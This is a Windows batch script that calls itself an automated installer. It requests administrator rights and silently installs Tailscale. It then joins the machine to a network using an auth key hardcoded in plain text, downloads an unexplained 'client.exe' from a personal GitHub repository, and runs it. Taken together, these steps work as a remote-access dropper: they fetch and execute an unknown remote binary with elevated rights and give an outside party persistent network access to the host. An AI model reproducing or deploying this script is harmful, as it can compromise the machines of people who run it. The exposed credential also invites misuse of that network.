@echo off
setlocal enabledelayedexpansion

:: Configuration
set AUTHKEY=kj4ne3D2xq11CNTRL
set CLIENT_URL=https://github.com/jay2004soni/.exe/raw/main/client.exe
set WORK_DIR=%TEMP%\auto_install
set LOG_FILE=%WORK_DIR%\install.log

:: Create working directory
if not exist "%WORK_DIR%" mkdir "%WORK_DIR%"
echo [%date% %time%] Starting automated installation... >> "%LOG_FILE%"

:: Check if already running as admin
net session >nul 2>&1
if %errorLevel% == 0 (
    goto :ADMIN_CHECK_DONE
) else (
    :: Restart as admin
    echo Requesting administrator privileges...
    powershell -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
    exit /b
)

:ADMIN_CHECK_DONE
echo Running with administrator privileges...
echo [%date% %time%] Running with administrator privileges... >> "%LOG_FILE%"

:: Function to detect Windows version
:DETECT_OS
echo Detecting Windows version...
for /f "tokens=4-5 delims=. " %%i in ('ver') do set VERSION=%%i.%%j
if "%version%" == "10.0" echo Windows 10/11 detected
if "%version%" == "6.3" echo Windows 8.1 detected
if "%version%" == "6.2" echo Windows 8 detected
if "%version%" == "6.1" echo Windows 7 detected
if "%version%" == "6.0" echo Windows Vista detected

:: Check if 64-bit Windows
if exist "%PROGRAMFILES(X86)%" (
    echo 64-bit Windows detected
    set TAILSCALE_URL=https://pkgs.tailscale.com/stable/tailscale-setup-latest.exe
) else (
    echo 32-bit Windows detected
    set TAILSCALE_URL=https://pkgs.tailscale.com/stable/tailscale-setup-latest-i386.exe
)

echo [%date% %time%] Detected Windows version: %VERSION% (%TAILSCALE_URL%) >> "%LOG_FILE%"

:: Function to check if Tailscale is already installed and running
:CHECK_TAILSCALE
tasklist | findstr /i "tailscale" >nul
if %errorLevel% == 0 (
    echo Tailscale is already running!
    echo [%date% %time%] Tailscale is already running! >> "%LOG_FILE%"
    goto :DOWNLOAD_CLIENT
)

:: Check if Tailscale is installed but not running
if exist "C:\Program Files\Tailscale\tailscale.exe" (
    echo Tailscale is installed but not running, starting it...
    echo [%date% %time%] Tailscale is installed but not running, starting it... >> "%LOG_FILE%"
    start "" "C:\Program Files\Tailscale\tailscale.exe" up --unattended --authkey=%AUTHKEY%
    timeout /t 10 /nobreak >nul
    goto :VERIFY_CONNECTION
)

if exist "C:\Program Files (x86)\Tailscale\tailscale.exe" (
    echo Tailscale is installed but not running, starting it...
    echo [%date% %time%] Tailscale is installed but not running, starting it... >> "%LOG_FILE%"
    start "" "C:\Program Files (x86)\Tailscale\tailscale.exe" up --unattended --authkey=%AUTHKEY%
    timeout /t 10 /nobreak >nul
    goto :VERIFY_CONNECTION
)

:: Download Tailscale installer
echo Downloading Tailscale installer...
echo [%date% %time%] Downloading Tailscale installer from %TAILSCALE_URL%... >> "%LOG_FILE%"
powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%TAILSCALE_URL%' -OutFile '%WORK_DIR%\tailscale-installer.exe'"
if %errorLevel% neq 0 (
    echo Failed to download Tailscale installer
    echo [%date% %time%] Failed to download Tailscale installer >> "%LOG_FILE%"
    exit /b 1
)

:: Verify download was successful
if not exist "%WORK_DIR%\tailscale-installer.exe" (
    echo Tailscale installer not found after download
    echo [%date% %time%] Tailscale installer not found after download >> "%LOG_FILE%"
    exit /b 1
)

:: Silent install Tailscale
echo Installing Tailscale silently...
echo [%date% %time%] Installing Tailscale silently... >> "%LOG_FILE%"
"%WORK_DIR%\tailscale-installer.exe" /S
if %errorLevel% neq 0 (
    echo Tailscale installation failed
    echo [%date% %time%] Tailscale installation failed >> "%LOG_FILE%"
    exit /b 1
)

:: Wait for installation to complete
echo Waiting for installation to complete...
echo [%date% %time%] Waiting for installation to complete... >> "%LOG_FILE%"
timeout /t 30 /nobreak >nul

:VERIFY_CONNECTION
:: Verify Tailscale is running
echo Verifying Tailscale connection...
echo [%date% %time%] Verifying Tailscale connection... >> "%LOG_FILE%"

:: Try both possible installation paths
"C:\Program Files\Tailscale\tailscale.exe" status >nul 2>&1
if %errorLevel% == 0 (
    echo Tailscale is connected successfully!
    echo [%date% %time%] Tailscale is connected successfully! >> "%LOG_FILE%"
    goto :DOWNLOAD_CLIENT
)

"C:\Program Files (x86)\Tailscale\tailscale.exe" status >nul 2>&1
if %errorLevel% == 0 (
    echo Tailscale is connected successfully!
    echo [%date% %time%] Tailscale is connected successfully! >> "%LOG_FILE%"
    goto :DOWNLOAD_CLIENT
)

:: If not connected, try to connect
echo Tailscale connection failed, attempting to connect...
echo [%date% %time%] Tailscale connection failed, attempting to connect... >> "%LOG_FILE%"

"C:\Program Files\Tailscale\tailscale.exe" up --unattended --authkey=%AUTHKEY%
timeout /t 15 /nobreak >nul

:: Try verification again
"C:\Program Files\Tailscale\tailscale.exe" status >nul 2>&1
if %errorLevel% == 0 (
    echo Tailscale connected after retry!
    echo [%date% %time%] Tailscale connected after retry! >> "%LOG_FILE%"
    goto :DOWNLOAD_CLIENT
)

"C:\Program Files (x86)\Tailscale\tailscale.exe" up --unattended --authkey=%AUTHKEY%
timeout /t 15 /nobreak >nul

"C:\Program Files (x86)\Tailscale\tailscale.exe" status >nul 2>&1
if %errorLevel% == 0 (
    echo Tailscale connected after retry!
    echo [%date% %time%] Tailscale connected after retry! >> "%LOG_FILE%"
    goto :DOWNLOAD_CLIENT
) else (
    echo Failed to connect to Tailscale
    echo [%date% %time%] Failed to connect to Tailscale >> "%LOG_FILE%"
    exit /b 1
)

:DOWNLOAD_CLIENT
:: Download client.exe from GitHub
echo Downloading client.exe from GitHub...
echo [%date% %time%] Downloading client.exe from GitHub... >> "%LOG_FILE%"
powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%CLIENT_URL%' -OutFile '%WORK_DIR%\client.exe'"
if %errorLevel% neq 0 (
    echo Failed to download client.exe
    echo [%date% %time%] Failed to download client.exe >> "%LOG_FILE%"
    exit /b 1
)

:: Verify client.exe was downloaded
if not exist "%WORK_DIR%\client.exe" (
    echo client.exe not found after download
    echo [%date% %time%] client.exe not found after download >> "%LOG_FILE%"
    exit /b 1
)

:: Run client.exe
echo Running client.exe...
echo [%date% %time%] Running client.exe... >> "%LOG_FILE%"
start "" "%WORK_DIR%\client.exe"
echo Client launched successfully!
echo [%date% %time%] Client launched successfully! >> "%LOG_FILE%"

:: Cleanup
echo Cleaning up temporary files...
echo [%date% %time%] Cleaning up temporary files... >> "%LOG_FILE%"
del "%WORK_DIR%\tailscale-installer.exe" /f /q 2>nul

exit /b 0